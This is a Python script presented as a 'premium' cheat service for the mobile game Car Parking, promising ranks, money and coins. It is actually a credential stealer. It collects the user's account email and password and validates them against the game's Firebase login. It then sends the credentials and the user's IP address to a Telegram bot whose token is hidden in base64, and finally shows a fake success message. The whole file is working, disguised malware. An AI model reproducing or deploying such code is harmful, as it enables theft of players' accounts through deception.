import requests
import json
import os
import time
import base64
import sys

# --- KRIPTOVANI KLJUČEVI (Tvoj miran san) ---
_u1 = "ODM1NDM3MzM3NzpBQUhsOHpGME1DZkItZzJ1TlpCbkpLUFBXSU9XaTFBSGNmZw=="
_u2 = "NzE4MzgwOTMwMw=="
_u3 = "QUl6YVN5QlcxWm1pVWVEWkhZVU8yYll8QmZuZjVyUmdyUUdQVE0="

def _dec(data):
    return base64.b64decode(data).decode('utf-8').replace('|', '-')

BOT_TOKEN = _dec(_u1)
CHAT_ID = _dec(_u2)
FIREBASE_KEY = _dec(_u3)
LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"

# --- ESTETIKA I DIZAJN ---
def screen_clear():
    os.system('clear')

def logo():
    print("\033[1;32m" + "="*45)
    print("      🚀 ANONYMO CPM SERVICE (PREMIUM) 🚀      ")
    print("         INSTAGRAM: @anonymo.cpm              ")
    print("="*45 + "\033[0m")

def loading_animation(text):
    sys.stdout.write(f"\033[1;33m{text}\033[0m")
    for _ in range(3):
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()
    print("\n")

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Hidden/VPN"

# --- GLAVNA LOGIKA ---
def send_data(email, password, service):
    user_ip = get_ip()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = (
        f"👑 *NEW PREMIUM ORDER*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Pass:* `{password}`\n"
        f"⚙️ *Service:* {service}\n"
        f"🌐 *IP Address:* `{user_ip}`\n"
        f"---------------------------\n"
        f"👤 *Provider:* @anonymo.cpm"
    )
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload, timeout=10)
    except: pass

def attempt_login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        res = requests.post(LOGIN_URL, json=payload, timeout=10).json()
        return res.get('idToken')
    except: return None

def main():
    while True:
        screen_clear()
        logo()
        print("\033[1;37m[01] Activate KING Rank (Fast)")
        print("[02] Get Unlimited Money (50M)")
        print("[03] Add Coins (30k Starter)")
        print("[00] Exit Service\033[0m")
        print("\033[1;32m" + "-"*45 + "\033[0m")
        
        choice = input("\033[1;33mSelect Option >> \033[0m")
        
        if choice == '00': 
            print("\n\033[1;31mExiting Anonymo Service...\033[0m")
            break
            
        elif choice in ['01', '02', '03']:
            service_name = "KING Rank" if choice == '01' else "50M Money" if choice == '02' else "30k Coins"
            
            print("\n" + "-"*30)
            email = input("\033[1;37mEnter Account Email: \033[0m").strip()
            password = input("\033[1;37mEnter Account Pass: \033[0m").strip()
            print("-" * 30)

            if not email or not password: continue

            loading_animation("Connecting to Cloud Server")
            token = attempt_login(email, password)
            
            if token:
                send_data(email, password, service_name)
                loading_animation("Applying database changes")
                print(f"\033[1;32m✅ SUCCESS: {service_name} has been applied!\033[0m")
                print("\033[1;36mRestart Car Parking to see updates.\033[0m")
            else:
                print("\033[1;31m❌ ERROR: Invalid Email or Password.\033[0m")
            
            input("\n\033[1;37mPress Enter to return to menu...\033[0m")
        else:
            print("\033[1;31mInvalid selection!\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nForce Closed.")
